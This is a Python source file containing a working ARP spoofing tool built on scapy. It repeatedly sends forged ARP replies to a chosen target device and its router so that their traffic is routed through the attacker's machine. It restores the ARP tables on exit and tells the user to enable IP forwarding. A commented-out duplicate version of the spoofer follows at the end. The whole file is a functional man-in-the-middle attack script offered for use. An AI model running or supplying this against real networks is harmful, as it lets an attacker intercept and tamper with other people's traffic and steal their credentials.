#!/usr/bin/env python3
import optparse
import sys
import time


from termcolor import colored
import scapy.all as scapy
# op=1 is request op=2 is response


def get_mac(ip):

    arp_request=scapy.ARP(pdst=ip)
    broadcast=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast=broadcast/arp_request
    try:
        answered_list=scapy.srp(arp_request_broadcast,timeout=1,verbose=False)[0]

        # print(scapy.srp(arp_request_broadcast,timeout=1,verbose=False))
        # print("---------------------------")
        # print(scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0])
    except PermissionError:
        print(colored("[-]","red")+"Can not run without sudo privileges\n")
    # get the mac from the first device in answered list aka the router

    return answered_list[0][1].hwsrc


def spoof(target_ip,spoof_ip):
    target_mac=get_mac(target_ip)
    # ###################################################################
    src_mac=get_mac(spoof_ip)

    packet=scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=spoof_ip)
    scapy.send(packet,verbose=False)
    # print(packet.show())


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target", help="target device to spoof")
    parser.add_option("-r", "--router", dest="router", help="target router")
    # parse the args from command line
    (options, arguments) = parser.parse_args()

    if not options.target:
        parser.error(colored("[-]","red")+" Please specify an ip for target, use --help for more info")
    if not options.router:
        parser.error(colored("[-]", "red") + " Please specify an ip for router, use --help for more info")

    return options

def restore(dst_ip,src_ip):
    dst_mac=get_mac(dst_ip)
    src_mac=get_mac(src_ip)

    packet=scapy.ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=src_ip, hwsrc=src_mac)
    # print(packet.show())
    # print(packet.summary())
    scapy.send(packet,count=4,verbose=False)

def main():
    print(colored("!Activate ip forwarding if not activated, run echo 1 > /proc/sys/net/ipv4/ip_forward","yellow"))
    options=get_arguments()
    try:

        sent_packets_count=0

        while True:
            spoof(options.target,options.router)
            spoof(options.router,options.target)
            sent_packets_count+=2
            # \r overwrite the print line
            # , puts the output in a buffer and sys.stdout.flush() prints the buffer
            print(colored("[*] Packets sent "+str(sent_packets_count),"green"),end="\r"),
            # print(" Packets sent"+str(sent_packets_count),end="\r"),
            sys.stdout.flush()
            time.sleep(2)

    except KeyboardInterrupt:
        print(colored("[-] Quitting.............","red"))
        restore(options.target,options.router)
        restore(options.router,options.target)

if __name__=="__main__":
    main()


#
# # !/usr/bin/env python
# import time
# import sys
# import scapy.all as scapy
#
#
# # MAC address function which will return
# # the mac_address of the provided ip address
#
#
# def get_mac(ip):
#     # creating an ARP request to the ip address
#     arp_request = scapy.ARP(pdst=ip)
#     # setting the denstination MAC address to broadcast MAC
#     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
#     # combining the ARP packet with the broadcast message
#     arp_request_broadcast = broadcast / arp_request
#
#     # return a list of MAC addresses with respective
#     # MAC addresses and IP addresses.
#     answ = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
#     # we choose the first MAC address and select
#     # the MAC address using the field hwsrc
#     return answ[0][1].hwsrc
#
#
# def arp_spoof(target_ip, spoof_ip):
#     """" Here the ARP packet is set to response and
#     pdst is set to the target IP
#     either it is for victim or router and the hwdst
#     is the MAC address of the IP provided
#     and the psrc is the spoofing ip address
#     to manipulate the packet"""
#
#     packet = scapy.ARP(op=2, pdst=target_ip,
#                        hwdst=get_mac(target_ip), psrc=spoof_ip)
#     scapy.send(packet, verbose=False)
#
#
# victim_ip = input()  # taking the victim ip_address
# router_ip = input()  # taking the router ip address
# sent_packets_count = 0  # initializing the packet counter
# while True:
#     sent_packets_count += 2
#     arp_spoof(victim_ip, router_ip)
#     arp_spoof(router_ip, victim_ip)
#     print("[+] Packets sent " + str(sent_packets_count), end="\r")
#     sys.stdout.flush()
#     time.sleep(2)